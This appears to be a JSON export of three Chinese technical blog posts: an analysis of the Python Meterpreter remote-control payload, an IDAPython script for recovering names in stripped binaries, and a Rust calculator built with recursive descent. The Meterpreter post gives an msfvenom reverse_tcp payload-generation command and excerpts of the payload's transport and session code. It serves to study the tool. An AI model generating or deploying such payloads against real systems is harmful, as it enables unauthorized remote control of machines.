[{"content":"meterpreter 是 metasploit 里自带的一款远程控制工具，具有正向/反向连接模式，并且功能强大，所以想分析下其实现。\n获取代码 meterpreter 的本体有很多种语言的实现，包括 C 实现的 mettle,还有在 metasploit-payloads 仓库里的 Python/PHP/Java 实现。这里选择 Python 实现。并且由于代码块中存在很多等待 Patch 的地方，所以这里直接用 msfvenom 生成一个。\nmsfvenom --payload python/meterpreter/reverse_tcp LHOST=192.168.92.1 LPORT=4444 简要分析 分析前准备 在代码中有开启日志的选项，并且还有去除启动时 fork 的选项，为了调试，把这两个选项修改成如下\n# these values will be patched, DO NOT CHANGE THEM DEBUGGING = True DEBUGGING_LOG_FILE_PATH = None TRY_TO_FORK = False 接下来启动就可以看到相关的日志了。\n~/d/t/meterpreter \u0026gt; python3 download.py download.py:1713: DeprecationWarning: the imp module is deprecated in favour of importlib and slated for removal in Python 3.12; see the module's documentation for alternative uses import codecs,imp,base64,zlib DEBUG:root:[*] running method core_negotiate_tlv_encryption DEBUG:root:[*] Negotiating TLV encryption DEBUG:root:[*] RSA key: 30820122300d06092a864886f70d01010105000382010f003082010a02820101009c3090c560a4e0b23b9b2141a48c6cbd42a67bde619931791e76b1a758761e061f2f50cfffe4c6eb47d2d15f07b2b0aed95c7c084d9d6b158e332126efbb4cebefc39979ca7a76fdba1291861e070b669f6febb795ada48b20e84356a6bb3daf7f74b179124ec87b08291e2a8e9f414a27b4e7dbbe3027a8d720cb46f6837f90747982c5b8cfa1ae8ee305203764b606f027da70a83f11a850cd6a4f4052eb85574c934ef5d50455b5cc822a23f0a9e6c44a305bf197216531ad6ac18adf1aa33042441a1fce964ed57da2ad6075d13787f4f9d17e69a35eb0a6fe10872e89eeb230bc0a15183618990933e786b952dd4783d299fd53e147421d442225f4d1470203010001 DEBUG:root:[*] AES key: 0x6ea0dd43076cdf8f560b094816af9fa8daa9bb8e15016f10370c69654970dd20 DEBUG:root:[*] Encrypted AES key: 0x676a4db54a6852f7c50566aceebd4c12f532ae763a9038e8c8c4a8f3f868f03cfd8b264aae861997dfa0eb4127edf2496ba252acfea0ad08f89e9e65ac196dea6b99b5af6982bfcbf77b9f59ef7bf8b59271ece5dc91209055ac9985361edbcd36fcedea212c0bf07adf36d319dfcc040b9a6869695c185a078466f8640f2581135c10ea8aeb2ec13053d5a89ab4b8388cf5df0b2e39671f885188469d5c776a9dded0277017e1bb693965d7eec66ade6df7597206544ad72a5c4ebc199275f40d02e5d270968e4a586946e35f51752a7d267d5e4df783a61fb6a21290f06d2879eec42d30de7e9550d54e73a11d42e42538131c90b7e7a60b6dc751884bb94e DEBUG:root:[*] TLV encryption sorted DEBUG:root:[*] sending response packet DEBUG:root:[*] running method core_set_session_guid DEBUG:root:[*] sending response packet DEBUG:root:[*] running method core_enumextcmd DEBUG:root:[*] sending response packet DEBUG:root:[*] running method core_enumextcmd DEBUG:root:[*] sending response packet DEBUG:root:[*] running method core_loadlib DEBUG:root:[*] sending response packet DEBUG:root:[*] running method stdapi_fs_getwd DEBUG:root:[*] sending response packet DEBUG:root:[*] running method stdapi_sys_config_getuid DEBUG:root:[*] sending response packet DEBUG:root:[*] running method stdapi_sys_config_sysinfo DEBUG:root:[*] sending response packet DEBUG:root:[*] running method core_set_uuid DEBUG:root:[*] sending response packet DEBUG:root:[*] running method stdapi_net_config_get_interfaces DEBUG:root:[*] sending response packet DEBUG:root:[*] running method stdapi_net_config_get_routes DEBUG:root:[*] sending response packet DEBUG:root:[*] running method core_channel_eof DEBUG:root:[-] method core_channel_eof resulted in error: #1 DEBUG:root:[*] running method stdapi_fs_getwd DEBUG:root:[*] sending response packet DEBUG:root:[*] running method stdapi_fs_stat DEBUG:root:[*] sending response packet DEBUG:root:[*] running method stdapi_fs_ls DEBUG:root:[*] sending response packet 协议部分 在接收数据时，程序主要是通过 Transport 类进行通信，并对通信数据的解密，得到的二进制数据通过 packet_get_tlv 函数进行解析。在返回数据时，则是通过 tlv_pack 函数将 TLV Packet 转换成二进制数据，并通过 Transport 类对数据进行加密通信。\nTransport 类 程序会通过 Transport 类进行通信，这个类会对通信数据使用 xor/AES 进行混淆。而 TcpTransport/HttpTransport 通过多态，重载 _send_packet 和 _get_packet 方法，来实现在不同的底层协议下的通信。这个协议前 4 字节是 XOR 的密钥，然后后 4 字节是这个 Packet 的长度，通过 XOR 解密长度后，继续从 socket 中读取，就可以取得整个 Packet 的数据。\nclass TcpTransport(Transport): # ...省略别的方法... def _get_packet(self): first = self._first_packet self._first_packet = False if not select.select([self.socket], [], [], 0.5)[0]: return bytes() packet = self.socket.recv(PACKET_HEADER_SIZE) if packet == '': # remote is closed self.request_retire = True return None if len(packet) != PACKET_HEADER_SIZE: if first and len(packet) == 4: # 省略设置超时的代码 pass return None xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE]) # XOR the whole header first header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE]) # Extract just the length pkt_length = struct.unpack('\u0026gt;I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF+PACKET_LENGTH_SIZE])[0] pkt_length -= 8 # Read the rest of the packet rest = bytes() while len(rest) \u0026lt; pkt_length: rest += self.socket.recv(pkt_length - len(rest)) # return the whole packet, as it's decoded separately return packet + rest def _send_packet(self, packet): self.socket.send(packet) 上面重载的 2 个方法都是私有成员，所以在别的类中，调用 get_packet 才能获取 Packet 数据。在 get_packet 中，则是先调用 _get_packet 函数获得数据，然后调用 decrypt_packet 进行解密。\nclass Transport(object): # ... def decrypt_packet(self, pkt): if pkt and len(pkt) \u0026gt; PACKET_HEADER_SIZE: xor_key = struct.unpack('BBBB', pkt[:PACKET_XOR_KEY_SIZE]) raw = xor_bytes(xor_key, pkt) enc_offset = PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE enc_flag = struct.unpack('\u0026gt;I', raw[enc_offset:enc_offset+PACKET_ENCRYPT_FLAG_SIZE])[0] if enc_flag == ENC_AES256: iv = raw[PACKET_HEADER_SIZE:PACKET_HEADER_SIZE+16] encrypted = raw[PACKET_HEADER_SIZE+len(iv):] return met_aes_decrypt(self.aes_key, iv, encrypted) else: return raw[PACKET_HEADER_SIZE:] return None def get_packet(self): self.request_retire = False try: pkt = self.decrypt_packet(self._get_packet()) except: debug_traceback() return None if pkt is None: return None self.communication_last = time.time() return pkt TLV 协议 meterpreter 使用的是 TLV 协议进行通信，整个 Packet 由 3 部分组成，前 4 个字节是 Packet 长度，后 4 个字节是 Packet 类型，剩下的字节则是数据。下面是解析数据的代码。将原始 Packet 数据传递给 packet_get_tlv 函数，返回值是包含解析后数据的 dict。\n@export def packet_enum_tlvs(pkt, tlv_type=None): offset = 0 while offset \u0026lt; len(pkt): tlv = struct.unpack('\u0026gt;II', pkt[offset:offset + 8]) if tlv_type is None or (tlv[1] \u0026amp; ~TLV_META_TYPE_COMPRESSED) == tlv_type: val = pkt[offset + 8:(offset + 8 + (tlv[0] - 8))] if (tlv[1] \u0026amp; TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING: val = str(val.split(NULL_BYTE, 1)[0]) elif (tlv[1] \u0026amp; TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT: val = struct.unpack('\u0026gt;I', val)[0] elif (tlv[1] \u0026amp; TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD: val = struct.unpack('\u0026gt;Q', val)[0] elif (tlv[1] \u0026amp; TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL: val = bool(struct.unpack('b', val)[0]) elif (tlv[1] \u0026amp; TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW: pass yield {'type': tlv[1], 'length': tlv[0], 'value': val} offset += tlv[0] return @export def packet_get_tlv(pkt, tlv_type): try: tlv = list(packet_enum_tlvs(pkt, tlv_type))[0] except IndexError: return {} return tlv 需要注意的是类型(Type)字段则是由不同 meta-type 组成的，包括 TLV_META_TYPE_STRING TLV_META_TYPE_UINT 等类型。而在程序通信时真正会用到的类型，则是由 meta-type 和 identifier 组成。这样做的目的是可以让程序对类型进行校验。可以看到下面的代码中，TLV_TYPE_CHANNEL_ID 是由 TLV_META_TYPE_UINT 和标识 50 组成的。\n# ... TLV_META_TYPE_UINT = (1 \u0026lt;\u0026lt; 17) # ... TLV_TYPE_CHANNEL_ID = TLV_META_TYPE_UINT | 50 开始部分 下面是代码最先运行的部分，可以看到是进行了 fork，并 setsid 让程序运行在后台，然后就是使用 socket 监听 4444 端口。收到连接时，使用 TcpTransport 建立一个 Transport 之后进入 PythonMeterpreter 进行主要交互逻辑。\n_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork') if not _try_to_fork or (_try_to_fork and os.fork() == 0): if hasattr(os, 'setsid'): try: os.setsid() except OSError: pass # ... bind_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) bind_sock.bind(('0.0.0.0', 4444)) bind_sock.listen(1) s, address = bind_sock.accept() transport = TcpTransport.from_socket(s) met = PythonMeterpreter(transport) # PATCH-SETUP-TRANSPORTS # met.run() PythonMeterpreter 这个类是真正负责逻辑交互的类。主要循环在 run 函数中，函数主要是获取 TLV Packet 数据，然后在 create_response 函数中解析数据，调用相关的处理函数，获得返回值，最后发送回复。然后是遍历 channel 读取和发送数据，从 channel 中读取数据后，发送给控制端。channel 的设计在后文中会讲解。\nclass PythonMeterpreter(object): def run(self): while self.running and not self.session_has_expired: request = self.get_packet() if request: response = self.create_response(request) if response: self.send_packet(response) # iterate over the keys because self.channels could be modified if one is closed channel_ids = list(self.channels.keys()) for channel_id in channel_ids: channel = self.channels[channel_id] data = bytes() write_request_parts = [] if isinstance(channel, MeterpreterProcess): # ... pass # ... if data: write_request_parts.extend([ {'type': TLV_TYPE_CHANNEL_ID, 'value': channel_id}, {'type': TLV_TYPE_CHANNEL_DATA, 'value': data}, {'type': TLV_TYPE_LENGTH, 'value': len(data)}, ]) self.send_packet(tlv_pack_request('core_channel_write', write_request_parts)) MeterpreterChannel Channel 是 meterpreter 运行程序，开启端口转发等功能时，进行交互的“通道”，这样的设计可以让其同时运行不同的功能，而不阻塞和用户之间的交互。在下面的代码中可以看到，Channel 和 meterpreter 之间的读写，也是通过 TLV 协议进行交互的。\n不同功能的 Channel 通过重载 MeterpreterChannel 的 read 和 write 等方法，实现不同的交互。\nclass MeterpreterChannel(object): # ... def core_read(self, request, response): length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value'] response += tlv_pack(TLV_TYPE_CHANNEL_DATA, self.read(length)) return ERROR_SUCCESS, response def core_write(self, request, response): channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value'] response += tlv_pack(TLV_TYPE_LENGTH, self.write(channel_data)) return ERROR_SUCCESS, response class MeterpreterSocket(MeterpreterChannel): # ... def read(self, length): return self.sock.recv(length) def write(self, data): return self.sock.send(data) core 和 stdapi core 是 meterpreter 的基础功能，包括 channel 和 transport 的管理等功能。这些功能的实现是在 PythonMeterpreter 类中以 \u0026ldquo;_core\u0026rdquo; 开头的函数，在类初始化时加入到 extension_functions dict 中供后续调用。而 stdapi 则是平时用到的扩展功能，包括上传/下载文件等功能，通过 core_loadlib 功能进行动态载入。\n总结 这里只是简单的过了一遍 meterpreter Python 实现的主体代码。加密密钥的传输，stdapi 的添加等细节则是没有提到，等后面有空了可能就会写了(\nRefs Using Metasploit Advanced Meterpreter Overview original specification ","date":"2022-10-23","permalink":"https://chenx6.github.io/post/meterpreter/","tags":["python","c2","rat"],"title":"meterpreter 简要分析"},{"content":"在逆向二进制程序中，经常碰到将程序 strip 了，但是日志函数中保留着函数名字的情况。所以写文记录在这种情况下，使用 IDAPython 恢复函数名字的过程。\n日志函数长什么样 下面是我手写的一个日志函数。主要有几个部分：\n日志级别 LogLevel，记录日志的最低级别 do_log_level，用来在不同的情况下过滤日志。 日志文件 log_file，将日志输出到对应的文件中。 记录日志的函数 logger_log，还有几个辅助记录日志的宏。在宏中则是将函数的名称也记录了下来，方便后期调试。 代码也非常简单粗暴，唯一需要注意的是 logger_log 用了 C 中的变长函数参数，并且在相关的宏中用了 gcc 扩展 “GCC variadic macro” 来处理宏中的变长参数。\n#include \u0026lt;stdarg.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; enum LogLevel { DEBUG = 0, INFO, WARNING, ERROR }; static FILE *log_file = NULL; static int do_log_level = 0; /// @brief init log file and log level void logger_init(const char *file_path, int log_level) { if (file_path) { log_file = fopen(file_path, \u0026quot;a+\u0026quot;); } else { log_file = stderr; } do_log_level = log_level; } /// @brief do log void logger_log(int level, const char *fmt, ...) { if (log_file == NULL) { return; } if (level \u0026lt; do_log_level) { return; } va_list vl; va_start(vl, fmt); vfprintf(log_file, fmt, vl); fputc('\\n', log_file); va_end(vl); } #define LOG_DEBUG(fmt, ...) \\ logger_log(DEBUG, \u0026quot;[DEBUG] [%s] \u0026quot; fmt, __FUNCTION__, ##__VA_ARGS__); #define LOG_INFO(fmt, ...) \\ logger_log(INFO, \u0026quot;[INFO] [%s] \u0026quot; fmt, __FUNCTION__, ##__VA_ARGS__); #define LOG_WARNING(fmt, ...) \\ logger_log(WARNING, \u0026quot;[WARNING] [%s] \u0026quot; fmt, __FUNCTION__, ##__VA_ARGS__); #define LOG_ERROR(fmt, ...) \\ logger_log(ERROR, \u0026quot;[ERROR] [%s] \u0026quot; fmt, __FUNCTION__, ##__VA_ARGS__); 接下来是一点测试代码\nint a_important_function() { LOG_WARNING(\u0026quot;Warning world, return value: %d\u0026quot;, 114514); return 1919810; } int main(int argc, char *argv[]) { logger_init(NULL, INFO); LOG_DEBUG(\u0026quot;Debug, world!\u0026quot;); LOG_INFO(\u0026quot;Info, world!\u0026quot;); // logger_log(INFO, \u0026quot;[INFO] [%s] Info, world!\u0026quot;, __FUNCTION__); int ret = 0; if ((ret = a_important_function()) != 0) { LOG_ERROR(\u0026quot;Error world, exit code: %d\u0026quot;, ret); } return 0; } 下面是程序运行后的输出，可以看到 DEBUG 级别低于要记录的 INFO 级别，所以 DEBUG 级别的日志没有输出。\n$ gcc test.c -o test -O0 -Wall $ ./test [INFO] [main] Info, world! [WARNING] [a_important_function] Warning world, return value: 114514 [ERROR] [main] Error world, exit code: 1919810 在 IDA 中，上面的代码长什么样 在反汇编结果中，可以看到虽然 DEBUG 级别的日志没有输出，但是相关的函数调用仍然在代码中保留着。并且每个日志函数的调用，在参数中都有函数名字。在这种情况下，就可以使用 IDAPython 进行自动化提取函数名字并且恢复回去了。\nint sub_401156(int a1, const char *a2, ...) { int result; // eax gcc_va_list arg; // [rsp+8h] [rbp-D0h] result = (signed int)stream; if ( stream ) { if ( dword_404070 \u0026lt;= a1 ) { va_start(arg, a2); vfprintf(stream, a2, arg); result = fputc(10, stream); } } return result; } __int64 __fastcall main(__int64 a1, char **a2, char **a3) { char *a4; // [rsp+1Ch] [rbp-4h] sub_401156(0LL, 1LL, a3); sub_4011A0(0, \u0026quot;[DEBUG] [%s] Debug, world!\u0026quot;, \u0026quot;main\u0026quot;, a2); sub_4011A0(1, \u0026quot;[INFO] [%s] Info, world!\u0026quot;, \u0026quot;main\u0026quot;); LODWORD(a4) = sub_40127B(1LL, \u0026quot;[INFO] [%s] Info, world!\u0026quot;); if ( (_DWORD)a4 ) sub_4011A0(3, \u0026quot;[ERROR] [%s] Error world, exit code: %d\u0026quot;, \u0026quot;main\u0026quot;, (unsigned int)a4); return 0LL; } IDAPython 登场 下面是脚本。思路则是使用 idautils.CodeRefsTo 获取日志函数的调用，并且从调用处使用 idaapi.get_arg_addrs 获得带函数名字参数的地址，然后从这个地址读取出函数名字，调用 idc.set_name 重命名当前函数。\nimport idaapi import idautils import idc import ida_ida func_addr = 0x4011a0 # log function address, Use 'y' to declare argument's type first # https://reverseengineering.stackexchange.com/questions/25301/getting-function-arguments-in-ida name_idx = 2 # function name in log call position # https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml if idaapi.IDA_SDK_VERSION \u0026lt;= 700: min_ea = idc.MinEA() max_ea = idc.MaxEA() else: min_ea = ida_ida.inf_get_min_ea() max_ea = ida_ida.inf_get_max_ea() def is_addr_invalid(addr): \u0026quot;\u0026quot;\u0026quot;Check `addr` is valid address\u0026quot;\u0026quot;\u0026quot; return ( addr == 0 or addr == 0xFFFFFFFF or addr == 0xFFFFFFFFFFFFFFFF or addr \u0026lt; min_ea or addr \u0026gt; max_ea ) def read_c_str(addr, limit=32): \u0026quot;\u0026quot;\u0026quot;Read C string from `addr`\u0026quot;\u0026quot;\u0026quot; if addr == 0 or addr == 0xFFFFFFFF or addr == 0xFFFFFFFFFFFFFFFF: return b\u0026quot;\u0026quot; curr_addr = addr ret = b\u0026quot;\u0026quot; while True: data = idc.get_bytes(curr_addr, 1) if data == b\u0026quot;\\x00\u0026quot; or data == 0: break if curr_addr \u0026gt; addr + limit: break ret += data curr_addr += 1 return ret def search_nearest_function(addr): \u0026quot;\u0026quot;\u0026quot;Search function that `addr` belongs to\u0026quot;\u0026quot;\u0026quot; prev_func = 0x0 for func in idautils.Functions(): if func \u0026gt; addr: break prev_func = func return prev_func refs = list(idautils.CodeRefsTo(func_addr, 0)) print(\u0026quot;[+] ref len %d\u0026quot; % len(refs)) for xref_addr in refs: # Get function argument args = idaapi.get_arg_addrs(xref_addr) if not args or len(args) \u0026lt;= name_idx: print(\u0026quot;[-] No args\u0026quot;) continue # Get argument address arg_addr = args[name_idx] if is_addr_invalid(arg_addr): print(\u0026quot;[-] Argument address is invalid\u0026quot;) continue # Get argument's immendiate value insn = idaapi.insn_t() length = idaapi.decode_insn(insn, arg_addr) func_name_addr = insn.ops[1].value if is_addr_invalid(func_name_addr): print(\u0026quot;[-] Function name address is invalid\u0026quot;) continue # Get function name func_name = read_c_str(func_name_addr) func = search_nearest_function(xref_addr) print(\u0026quot;[+] %x %s\u0026quot; % (func, func_name)) idc.set_name(func, func_name, 0) 有些地方需要注意：判断函数地址是否在程序运行虚拟地址，读取 C 式字符串，获得当前指令所属的函数地址是自己写的函数，可能有更好的内置函数来辅助判断。还有 get_arg_addrs 函数，获得的是给参数赋值的指令地址，例如对下面的代码，使用 [\u0026quot;%x\u0026quot; % i for i in idaapi.get_arg_addrs(0x4012d6)]，得到的返回值是 ['4012cc', '4012c7', '4012c2']，而不是字符串地址，所以得对指令使用 idaapi.decode_insn 进行解码，获得立即数的地址，即字符串的地址。还有就是日志函数有可能类型定义有问题，会导致 get_arg_addrs 返回 None，这种情况下，对着日志函数按 \u0026ldquo;y\u0026rdquo; 对参数类型和数量进行编辑，编辑后再次运行脚本即可获取参数。\n.text:00000000004012C2 mov edx, offset aMain ; \u0026quot;main\u0026quot; .text:00000000004012C7 mov esi, offset aDebugSDebugWor ; \u0026quot;[DEBUG] [%s] Debug, world!\u0026quot; .text:00000000004012CC mov edi, 0 ; a1 .text:00000000004012D1 mov eax, 0 .text:00000000004012D6 call sub_4011A0 代码运行结果如下，可以看到，补全了没有符号的 a_important_function 函数名字，达到了基本效果。\n[+] ref len 4 [+] 40127b a_important_function [+] 4012a4 main [+] 4012a4 main [+] 4012a4 main Refs The Beginner’s Guide to IDAPython Version 6.0 Getting function arguments in ida Porting from IDAPython 6.x-7.3, to 7.4 ","date":"2022-07-24","permalink":"https://chenx6.github.io/post/from_log/","tags":["ida","python"],"title":"从日志函数中回复无符号的函数名字"},{"content":"”想写个计算器“这件事情应该是我刚学会 C 语言时候的事情，当时还看不懂栈，逆波兰式等结构。但是现在不一样了，我不仅学过数据结构，还学过了编译原理。这次我就拿学过的编译原理相关知识写个计算器。\n前置知识 上下文无关语法(CFG)：描述了语句是如何形成的。\n语句：从语法规则里推导出的一个符号串。\n产生式：CFG 中每个规则都称为一个产生式。\n非终结符：语法产生式中的变量\n终结符：出现在语句中的单词，单词包含一个词素及语法范畴。在语法中，单词通过其语法范畴表示。\n整体架构 整体流程就是 “词法分析 -\u0026gt; 语法分析 -\u0026gt; 解析语法树” 进行计算。\n几个文件分布如下：\n. ├── Cargo.lock ├── Cargo.toml └── src ├── lexer.rs # 手写词法分析 ├── main.rs # 程序入口，实现表达式计算 └── parser.rs # 递归下降语法分析 词法分析 先定义好 Token。Rust 的枚举类型异常强大，写起来没什么问题。主要是括号，算数运算符，还有数字。\n#[derive(Debug, PartialEq)] pub enum OperatorType { Plus, Sub, Div, Mul, } #[derive(Debug, PartialEq)] pub enum BracketType { Left, Right, } #[derive(Debug, PartialEq)] pub enum Token { Number(i32), Operator(OperatorType), Bracket(BracketType), } 然后是定义一个 Scanner。主要作用就是扫描用户输入，通过函数调用不断的返回用户输入字符串的一部分，还有就是向下一个字符前进。\nstruct Scanner { raw: String, pos: usize, } impl Scanner { fn new(s: \u0026amp;str) -\u0026gt; Scanner { Scanner { raw: String::from(s), pos: 0, } } fn peek(\u0026amp;mut self) -\u0026gt; Option\u0026lt;char\u0026gt; { self.raw.chars().nth(self.pos) } fn next(\u0026amp;mut self) -\u0026gt; Option\u0026lt;char\u0026gt; { self.pos += 1; self.raw.chars().nth(self.pos - 1) } } 接下来就是词法分析本体。主要工作就是从 Scanner 读取和解析用户输入，并且在调用相应的函数时，返回相应的 Token。相当于一个手写的状态机。\n/// A hand-written lexer #[derive(Debug)] pub struct Lexer { tokens: Vec\u0026lt;Token\u0026gt;, pos: usize, } impl Lexer { pub fn new(s: \u0026amp;str) -\u0026gt; Result\u0026lt;Lexer, LexerError\u0026gt; { let mut scanner = Scanner::new(s); let mut tokens = vec![]; while let Some(ch) = scanner.peek() { match ch { // 省略一大堆代码 _ =\u0026gt; {} } } Ok(Lexer { tokens, pos: 0 }) } pub fn next(\u0026amp;mut self) -\u0026gt; Option\u0026lt;\u0026amp;Token\u0026gt; { self.pos += 1; self.tokens.get(self.pos - 1) } pub fn peek(\u0026amp;mut self) -\u0026gt; Option\u0026lt;\u0026amp;Token\u0026gt; { self.tokens.get(self.pos) } } 下面是之前代码中省略的部分，即读取和解析用户输入字符，通过当前字符来来生成不同的 Token。例如解析数字 Token 这部分则是不断的读取是数字的字符到 buf 里，等到不是数字的字符时停止读取，并从 buf 里解析数字。还有就是在碰到空格时则跳过当前字符。\nmatch ch { // Operator '+' | '-' | '*' | '/' =\u0026gt; { let op = match ch { '+' =\u0026gt; OperatorType::Plus, '-' =\u0026gt; OperatorType::Sub, '*' =\u0026gt; OperatorType::Mul, '/' =\u0026gt; OperatorType::Div, _ =\u0026gt; return Err(LexerError::LexError), }; tokens.push(Token::Operator(op)); scanner.next(); } // Number '0'..='9' =\u0026gt; { let mut buf = String::new(); while let Some(ch) = scanner.peek() { if !('0'..='9').contains(\u0026amp;ch) { break; } buf.push(ch); scanner.next(); } tokens.push(Token::Number( buf.parse::\u0026lt;i32\u0026gt;() .map_err(|_| LexerError::NumberFormatError)?, )) } // Bracket '(' | ')' =\u0026gt; { let br = match ch { '(' =\u0026gt; BracketType::Left, ')' =\u0026gt; BracketType::Right, _ =\u0026gt; return Err(LexerError::LexError), }; tokens.push(Token::Bracket(br)); scanner.next(); } // Skip blank ' ' =\u0026gt; { scanner.next(); } _ =\u0026gt; return Err(LexerError::UnknownChar), } 语法分析 我们需要根据上下文无关文法来进行语法分析。下面是带优先级的算数表达式语法。可以看到这有 3 级别优先级，括号优先级最高，乘除第二，加减第三。为了给输入符号串推断出一个推导，我们选用自顶向下分析器，从语法树的根开始构造语法树。\nGoal -\u0026gt; Expr Expr -\u0026gt; Expr + Term | Expr - Term | Term Term -\u0026gt; Term * Factor | Term / Factor | Factor Factor -\u0026gt; ( Expr ) | number 如果是处理编程语言中的一元运算符，得按照下面的文法进行处理。一元运算符优先级比 Factor 优先级低，比乘除优先级高。\nGoal -\u0026gt; Expr Expr -\u0026gt; Expr + Term | Expr - Term | Term Term -\u0026gt; Term * Value | Term / Value | Value Value -\u0026gt; || Factor | Factor Factor -\u0026gt; ( Expr ) | number 左递归 这个文法的第二个产生式可以一直往 Expr 非终结符推导，不断的递归下去，不能正确解析语法。\nExpr -\u0026gt; Expr Expr -\u0026gt; Expr Expr Expr -\u0026gt; Expr Expr Expr ... 导致这种问题的原因是因为产生了左递归。所以通过类似下面文法的做法，消除左递归（产生右递归）。\nFee -\u0026gt; Fee a =\u0026gt; Fee -\u0026gt; b Fee' | b Fee' -\u0026gt; a Fee' | e 消除过左递归的文法如下：\nE -\u0026gt; T E' E' -\u0026gt; + T E' | - T E' | ε T -\u0026gt; F T' T' -\u0026gt; * F T' | / F T' | ε F -\u0026gt; ( E ) | i 回溯 如果语法分析器用了错误的产生式扩展 AST 的下边缘节点，语法分析树的下边缘和词法分析器返回的 Token 会出现不匹配的情况，这时候就得回溯回之前的状态，重新选择新的产生式子。\n例如在下面的产生式中，可能出现先选择了产生式 1，发现不匹配后又回退到 2。这种情况相比直接选择产生式 2 就浪费了时间。\n1 Expr -\u0026gt; Expr + Term 2 | Expr - Term 3 | Term 下面是为了避免回溯所需要的相关集合。\nFIRST 集合：对于语法符号 $\\alpha$ $，FIRST( \\alpha)$ 是从 $\\alpha$ 推导出的语句开头可能出现的终结符集合通过 FIRST 集前瞻一个符号来避免回溯，选择合适的语句，实现高效解析。\nFOLLOW 集合：对于非终结符 $\\alpha$，$FOLLOW(\\alpha)$ 是在语句中紧接 $\\alpha$ 出现的单词的集合。通过 FOLLOW 集判断能不能将非终结符推导为 ε，来区分当前输入为合法输入还是语法错误。\n通过构造 FIRST+ 集，可以准确规定使得某个语法对自顶向下语法分析器无回溯条件。\n$$ FIRST^{+}(A\\to \\beta) = \\begin{cases} FIRST(\\beta) \u0026amp; \\text 如果 \\epsilon \\notin FIRST(\\beta) \\cr FIRST(\\beta) \\cup FOLLOW(A) \u0026amp; \\text 剩余情况 \\cr \\end{cases} $$\n代码实现 接下来就是编写递归下降语法分析器了。语法分析则是从 lexer 中不断的读取 Token，并使用递归下降进行解析。\n/// A recursive descent parser pub struct Parser { lexer: Lexer, } impl Parser { pub fn new(lexer: Lexer) -\u0026gt; Parser { Parser { lexer } } pub fn parse(\u0026amp;mut self) -\u0026gt; Result\u0026lt;Node, ParseError\u0026gt; { self.e() } // 省略 } 接下来是代码中最长的部分，按照文法编写递归下降解析器。对于每个非终结符，只需按照产生式依次调用相应的函数即可进行相应的分析。对于终结符，可以直接对 Token 进行处理。在编写程序时，可以将当前步骤产生的 AST 节点传递给下一个函数继续处理，从而实现完整的构造 AST。\n在下面的代码可以看到处理 \u0026ldquo;E\u0026rsquo;\u0026rdquo; 非终结符的 equote 函数，对应的产生式是 \u0026ldquo;E\u0026rsquo; -\u0026gt; +TE\u0026rsquo;|-TE\u0026rsquo;|ε\u0026rdquo;。在函数中 match arm 有 3 个 arm。第一个 arm 处理当前 Token 为 \u0026ldquo;+\u0026rdquo; 和 \u0026ldquo;-\u0026rdquo; 的情况，在这种情况下，继续调用 t, equote 函数进行处理。第二个 arm 则是看下当前 Token 是否在 FIRST+ 集合里，如果在的话，则说明当前语句处理结束。如果前 2 个 arm 都没有匹配上，说明输入有问题，返回错误。\nimpl Parser { pub fn parse(\u0026amp;mut self) -\u0026gt; Result\u0026lt;Node, ParseError\u0026gt; { self.e() } // E -\u0026gt; TE' fn e(\u0026amp;mut self) -\u0026gt; Result\u0026lt;Node, ParseError\u0026gt; { let t = self.t()?; self.equote(t) } // E' -\u0026gt; +TE'|-TE'|ε fn equote(\u0026amp;mut self, val: Node) -\u0026gt; Result\u0026lt;Node, ParseError\u0026gt; { // Select sentence by looking for FIRST+ match self.lexer.peek() { // E' -\u0026gt; +TE'|-TE' Some(\u0026amp;Token::Operator(ref op @ (OperatorType::Plus | OperatorType::Sub))) =\u0026gt; { let op = op.clone(); // Get op from reference self.lexer.next(); let t = self.t()?; self.equote(Node::BinaryExpr { op, lhs: Box::new(val), rhs: Box::new(t), }) } // E' -\u0026gt; ε Some(\u0026amp;Token::Bracket(BracketType::Right)) | None =\u0026gt; Ok(val), _ =\u0026gt; Err(ParseError::Unmatch), } } 运算 这里对 AST 进行了 DFS 来计算 AST 的值。后面有空的话，可以实现个虚拟机来处理。\n/// Eval AST fn eval(node: \u0026amp;Node) -\u0026gt; i32 { match node { Node::Number(n) =\u0026gt; *n, Node::UnaryExpr { op, child } =\u0026gt; { let child = eval(child); match op { OperatorType::Plus =\u0026gt; child, OperatorType::Sub =\u0026gt; -child, _ =\u0026gt; child, } } Node::BinaryExpr { op, lhs, rhs } =\u0026gt; { let lhs_ret = eval(lhs); let rhs_ret = eval(rhs); match op { OperatorType::Plus =\u0026gt; lhs_ret + rhs_ret, OperatorType::Sub =\u0026gt; lhs_ret - rhs_ret, OperatorType::Mul =\u0026gt; lhs_ret * rhs_ret, OperatorType::Div =\u0026gt; lhs_ret.checked_div(rhs_ret).unwrap_or(0), } } } } 总结 最后放上代码 代码在这。看下代码行数，可以看到只用了 300 行左右（带注视，空格）就完成了个基础的计算器。\n这个项目还值 7000 USD，血赚 233\n$ scc ─────────────────────────────────────────────────────────────────────────────── Language Files Lines Blanks Comments Code Complexity ─────────────────────────────────────────────────────────────────────────────── Rust 3 334 28 24 282 3 TOML 1 8 2 1 5 0 gitignore 1 2 0 0 2 0 ─────────────────────────────────────────────────────────────────────────────── Total 5 344 30 25 289 3 ─────────────────────────────────────────────────────────────────────────────── Estimated Cost to Develop (organic) $7,337 Estimated Schedule Effort (organic) 2.124802 months Estimated People Required (organic) 0.306786 ─────────────────────────────────────────────────────────────────────────────── Processed 9429 bytes, 0.009 megabytes (SI) ─────────────────────────────────────────────────────────────────────────────── Refs 《编译器设计》第二版 语法分析：LL(1)分析 知乎上的大佬们推荐的这本《编译器设计》比龙书更加通俗易懂，贴近现实，强烈推荐！\n","date":"2022-06-02","permalink":"https://chenx6.github.io/post/calculator/","tags":["plt","rust"],"title":"使用编译原理的知识，用 